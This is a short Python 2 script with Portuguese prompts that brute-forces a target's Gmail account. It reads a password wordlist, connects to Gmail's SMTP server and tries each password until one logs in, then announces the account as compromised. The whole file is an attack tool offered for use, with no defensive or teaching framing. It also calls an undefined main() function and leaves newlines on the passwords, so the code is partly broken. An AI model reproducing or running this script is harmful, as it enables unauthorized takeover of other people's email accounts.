#!/usr/bin/python2

'''CRIADO POR WINVASOR'''
 
import re
import sys,os
import random
import smtplib
from os import system

file_path = raw_input('INSIRA A WORDLIST :')
def login():
      pass_file = open(file_path,'r')
      pass_list = pass_file.readlines()
      i = 0
      user_name = raw_input('GMAIL DO ALVO :')
      server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
      server.ehlo()
      for password in pass_list:
         i = i + 1
         print str(i) + '/' + str(len(pass_list))
         try:
            server.login(user_name, password)
            system('clear')
            main()
            print '\n'
            print '[+] A CONTA JA ERA > :' + password
            break
         except smtplib.SMTPAuthenticationError as e:
            error = str(e)
            if error[14] == '<':
               system('clear')
               main()
               print '[+] A CONTA JA ERA :' + password

               break
            else:
               print '[!] SENHA NAO EXISTE => ' + password
login()
